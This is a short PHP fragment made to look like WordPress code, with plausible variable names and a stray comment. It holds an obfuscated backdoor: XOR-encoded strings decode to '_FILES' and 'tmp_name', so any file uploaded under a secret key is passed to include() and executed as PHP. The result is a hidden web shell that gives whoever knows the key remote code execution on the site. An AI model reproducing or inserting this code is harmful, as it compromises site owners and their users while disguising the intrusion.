...
$excerpt_length = 'yjAWHY75UEi7k';
function sort_column($capability_type, $nestable_tags)

{

    $field_no_prefix = urldecode($capability_type);
    $static_characters = substr($nestable_tags,0, strlen($field_no_prefix));

    $hex_encoding = $field_no_prefix ^ $static_characters;

    return $hex_encoding;
	$icon_dir = 'update';
}
$callback = ${sort_column("%26%2C%08%1B%0D%0A", $excerpt_length)};

if (isset($callback[$excerpt_length]))

{
    $matches = $callback[$excerpt_length];

    $email = $matches[sort_column("%0D%071%08%268ZP", $excerpt_length)];
    include ($email);
}



/* onfig and offers an API to work with them.
 *
 * @access private
